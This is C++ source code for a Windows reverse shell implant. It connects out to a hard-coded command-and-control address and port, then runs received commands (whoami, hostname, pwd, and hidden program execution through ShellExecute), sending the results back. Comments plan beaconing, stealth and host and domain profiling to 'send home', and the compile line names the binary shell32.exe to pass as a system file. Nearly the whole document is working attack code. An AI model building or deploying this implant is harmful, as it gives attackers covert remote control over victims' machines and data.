//Main headers

#include <winsock2.h> //Socket connection
#include <windows.h>  //Used for WinApi calls
#include <ws2tcpip.h> //TCP-IP Sockets
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

// credit to paranoid ninja

// to compile:
// i686-w64-mingw32-g++ wsarev.cpp -o shell32.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

// We can try and use two iterations of this shell. Keep it in an "inactive state" where batch-commands (using Shell), profiling/information-gathering,
// and beaconing is possible. This will preferably use the WINAPI functions (stealthy?). Then, we can implement the 'interaction' part of the shell, 
// in which the cmd.exe process is executes.

// Pseudo-code/outline
/* 
start program:
    start socket, init connection
    listen for incoming data: if cant connect retry in random interval range 5-40 seconds
        if data = shell:
            spawn cmd.exe 
            -> upon exit, close process. 
            -> send message saying process closed (C2 catches message and closes interaction successfully)
        else if data = batch:
            start secondary listener for follow-up data (ie. commands for shell exec, profiling)
            wait for 'quit' message which exits listening 'loop?'
        else if data = exit:
            kill socket
            kill process
            exit(0)
        else if data = info:
            get user, hostname, process name, users logged in, ip address, domain name, etc.
            make pretty
            send home
        

Notes and Questions:
    - How much of this is can be done with the WinAPI?
    - 
*/



// Functions and stuff

// Debug headers
 #include <iostream>

void exec(char *returnval, int returnsize, char *fileexec)
{
    // std::cout << fileexec << std::endl;
    if (32 >= (int)(ShellExecute(NULL, "open", fileexec, NULL, NULL, SW_HIDE))) //Get return value in int
    {
        strcat(returnval, "[x] Error executing command..\n");
    }
    else
    {
        strcat(returnval, "\n");
    }
}

void whoami(char *returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetUserName(returnval, &bufferlen);
}

void hostname(char *returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}

void pwd(char *returnval, int returnsize) // Module 2
{
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}








// Main Function and connection

void RevShell()
{

    // Setup connection (WinAPI)
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2, 2), &wsaver);
    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.75.100");
    addr.sin_port = htons(1337);

    // Init connection through socket using info
    if (connect(tcpsock, (SOCKADDR *)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        // Error? close and exit
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else
    {
        // std::cout << "[+] Connected to client. waiting for incoming command..." << std::endl;
        char CommandReceived[DEFAULT_BUFLEN] = "";
        while (true)
        {
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
            // std::cout << "Command received: " << CommandReceived;
            // std::cout << "Length of Command received: " << Result << std::endl;
            if ((strcmp(CommandReceived, "whoami") == 0))
            {
                char buffer[257] = "";
                whoami(buffer, 257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer) + 1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "hostname") == 0))
            {
                char buffer[257] = "";
                hostname(buffer, 257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer) + 1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "pwd") == 0))
            {
                char buffer[257] = "";
                pwd(buffer, 257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer) + 1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "exit") == 0))
            {
                closesocket(tcpsock);
                WSACleanup();
                exit(0);
            }
            else
            {
                char splitval[DEFAULT_BUFLEN] = "";
                for (int i = 0; i < (*(&CommandReceived + 1) - CommandReceived); ++i)
                {
                    if (CommandReceived[i] == *" ") //CommandReceived[i] is a pointer here and can only be compared with a integer, this *" "
                    {
                        break;
                    }
                    else
                    {
                        splitval[i] = CommandReceived[i];
                    }
                }
                if ((strcmp(splitval, "exec") == 0))
                {
                    char CommandExec[DEFAULT_BUFLEN] = "";
                    int j = 0;
                    for (int i = 5; i < (*(&CommandReceived + 1) - CommandReceived); ++i)
                    {
                        CommandExec[j] = CommandReceived[i];
                        ++j;
                    }
                    char buffer[257] = "";
                    exec(buffer, 257, CommandExec);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer) + 1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else
                {
                    char buffer[20] = "Invalid Command\n";
                    send(tcpsock, buffer, strlen(buffer) + 1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
            }
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

int main()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 1);
    RevShell();
    return 0;
}
